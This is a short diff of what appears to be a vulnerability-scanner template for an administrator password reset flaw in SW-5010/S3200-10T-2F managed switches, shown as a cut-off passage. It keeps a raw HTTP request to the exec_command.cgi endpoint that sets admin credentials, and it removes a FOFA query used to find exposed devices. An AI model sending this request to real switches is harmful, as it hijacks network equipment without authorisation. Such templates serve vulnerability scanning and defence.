@@ -3,12 +3,8 @@ info:
   name: SW-5010&S3200-10T-2F全千兆网管型交换机存在管理员密码重置漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rkn2qsxovncpunqc'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rkn2qsxovncpunqc
-    fofa: 'body="#weicom" && body="border:1px solid #CCC"'
 http:
 - raw:
   - 'GET /cgi-bin/exec_command.cgi?rand=0.6639611283476505&action=1&cgi_dest=username_admin3_password_encrypt_admin3&cli_node=11 HTTP/1.1
